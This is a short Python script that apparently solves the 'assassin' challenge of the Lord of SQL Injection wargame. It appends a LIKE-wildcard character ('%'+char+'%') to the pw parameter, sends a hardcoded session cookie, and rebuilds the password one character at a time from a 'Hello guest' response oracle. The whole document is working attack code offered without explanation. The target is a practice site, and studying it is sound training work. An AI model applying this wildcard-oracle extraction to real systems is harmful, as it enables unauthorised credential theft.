import requests
import urllib

url = "http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=%"
session = dict(PHPSESSID="tg6nlvfgcjcmvqdrp1vu3k54o3")

pw=""

print("[*] start ")

print("[*] find password")

for i in range(48,128):
	try:
		query=url+chr(i)+"%"
		r=requests.post(query,cookies=session)
	except:
		print("[*] exception")

	if "Hello guest" in r.text:
		pw+=chr(i)
		print("[*] find: ",pw)

print("[*] password : ",pw)